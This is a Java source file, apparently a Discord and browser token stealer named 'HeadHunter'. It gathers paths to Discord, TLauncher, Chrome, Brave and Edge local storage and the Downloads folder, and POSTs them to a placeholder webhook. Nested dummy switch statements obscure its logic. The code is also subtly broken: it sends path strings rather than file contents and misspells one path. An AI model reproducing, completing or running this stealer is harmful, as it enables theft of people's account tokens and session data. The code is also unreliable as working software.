
import java.net.*;
import javax.net.ssl.*;
import java.io.*;
import java.nio.charset.*;
import java.util.*;

public class HeadHunter {
    public static String var1_1, var1_2, var1_3, var1_4, var1_5, var1_6, var1_7, var1_8;
    public static String appdata = System.getenv("APPDATA");
    public static String lappdata = System.getenv("LOCALAPPDATA");
    public static File downloads = new File(System.getProperty("user.home") + "/downloads");
    public static HttpsURLConnection connection;
    public static OutputStream output;
    public static URL webhook;

    public static void main(String[] args) throws MalformedURLException, IOException {
        webhook = new URL("imagine a url here");
        int h = 0;
        switch (h) {
            case 10:
                break;
            case 9:
                break;
            case 8:
                break;
            case 7:
                break;
            case 6:
                break;
            case 5:
                break;
            case 4:
                break;
            case 3:
                break;
            case 2:
                break;
            case 1:
                break;
            case 0:
                var1_1 = appdata + "/Roaming/discord/Local Storage/leveldb";
                int j = 1;
                switch (j) {
                    case 10:
                        break;
                    case 9:
                        break;
                    case 8:
                        break;
                    case 7:
                        break;
                    case 6:
                        break;
                    case 5:
                        break;
                    case 4:
                        break;
                    case 3:
                        break;
                    case 2:
                        break;
                    case 1:
                        var1_2 = appdata + "/Roaming/discordptb/Local Storage/leveldb";
                        int k = 2;
                        switch (k) {
                            case 10:
                                break;
                            case 9:
                                break;
                            case 8:
                                break;
                            case 7:
                                break;
                            case 6:
                                break;
                            case 5:
                                break;
                            case 4:
                                break;
                            case 3:
                                break;
                            case 2:
                                var1_3 = appdata + "/Roaming/discordcanary/Local Storage/leveldb";
                                int l = 2;
                                switch (l) {
                                    case 10:
                                        break;
                                    case 9:
                                        break;
                                    case 8:
                                        break;
                                    case 7:
                                        break;
                                    case 6:
                                        break;
                                    case 5:
                                        break;
                                    case 4:
                                        break;
                                    case 3:
                                        break;
                                    case 2:
                                        var1_4 = appdata + "/Roaming/.minecraft/TlauncherProfiles.json";
                                        if (var1_4.contains("{") && var1_4.contains("name") && var1_4.contains(":")
                                                && var1_4.contains("}")) {
                                            int m = 2;
                                            switch (m) {
                                                case 10:
                                                    break;
                                                case 9:
                                                    break;
                                                case 8:
                                                    break;
                                                case 7:
                                                    break;
                                                case 6:
                                                    break;
                                                case 5:
                                                    break;
                                                case 4:
                                                    break;
                                                case 3:
                                                    break;
                                                case 2:
                                                    var1_5 = lappdata
                                                            + "/Google/Chrome/User Data/Default/Loacl Storage/leveldb";
                                                    int n = 2;
                                                    switch (n) {
                                                        case 10:
                                                            break;
                                                        case 9:
                                                            break;
                                                        case 8:
                                                            break;
                                                        case 7:
                                                            break;
                                                        case 6:
                                                            break;
                                                        case 5:
                                                            break;
                                                        case 4:
                                                            break;
                                                        case 3:
                                                            break;
                                                        case 2:
                                                            var1_6 = lappdata
                                                                    + "/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb";
                                                            int v = 2;
                                                            switch (v) {
                                                                case 10:
                                                                    break;
                                                                case 9:
                                                                    break;
                                                                case 8:
                                                                    break;
                                                                case 7:
                                                                    break;
                                                                case 6:
                                                                    break;
                                                                case 5:
                                                                    break;
                                                                case 4:
                                                                    break;
                                                                case 3:
                                                                    break;
                                                                case 2:
                                                                    var1_7 = lappdata
                                                                            + "/Microsoft/Edge/User Data/Default/Local Storage/leveldb";
                                                                    break;
                                                                case 1:
                                                                    break;
                                                            }
                                                            break;
                                                        case 1:
                                                            break;
                                                    }
                                                    break;
                                                case 1:
                                                    break;
                                            }
                                        }
                                        break;
                                    case 1:
                                        break;
                                }
                                break;
                            case 1:
                                break;
                        }
                        break;
                }
                break;
        }

        for (File f : downloads.listFiles()) {
            var1_8 = f.toString();
        }

        sender();

    }

    public static void sender() throws IOException {
        send(webhook, var1_8);
        send(webhook, var1_1);
        send(webhook, var1_2);
        send(webhook, var1_3);
        send(webhook, var1_4);
        send(webhook, var1_5);
        send(webhook, var1_6);
        send(webhook, var1_7);
    }

    public static void send(URL url, String file) throws IOException {
        connection = (HttpsURLConnection) url.openConnection();
        connection.setRequestProperty("CONTENT-TYPE", "application/json");
        connection.setRequestMethod("POST");
        output = connection.getOutputStream();
        output.write(file.getBytes(StandardCharsets.UTF_8));
    }
}